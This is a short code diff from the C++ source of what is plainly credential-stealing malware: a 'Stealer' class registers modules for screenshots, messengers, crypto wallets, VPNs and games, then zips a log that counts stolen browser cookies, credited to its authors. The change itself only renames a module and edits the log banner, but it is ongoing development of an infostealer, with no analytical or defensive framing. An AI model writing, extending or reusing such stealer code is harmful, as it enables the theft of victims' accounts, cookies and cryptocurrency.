@@ -6,7 +6,7 @@
 #include "miniz.h"
 #include "impl/Screenshot.h"
 #include "impl/Info.h"
-#include "impl/messengers/Socials.h"
+#include "impl/messengers/Messengers.h"
 #include "impl/files/Files.h"
 #include "impl/Processes.h"
 #include "impl/crypto/Crypto.h"
@@ -21,7 +21,7 @@
 
 void Stealer::registerModules() {
     this->modules.push_back(new Screenshot());
-    this->modules.push_back(new Socials());
+    this->modules.push_back(new Messengers());
     this->modules.push_back(new Crypto());
     this->modules.push_back(new VPNs());
     this->modules.push_back(new Games());
@@ -113,7 +113,7 @@ fs::path Stealer::zip_log() {
 
     std::stringstream comment;
 
-    comment << NAME << " v" << VERSION << " - coded by .1qxz, xakerxlop with Love <3" << "\n";
+    comment << NAME << "™️ v" << VERSION << " - coded by .1qxz, xakerxlop with Love <3" << "\n";
     comment << "\n";
     comment << "== Browsers ==" << "\n";
     comment << "Cookies: " << std::to_string(Counter::getCookies()) << "\n";
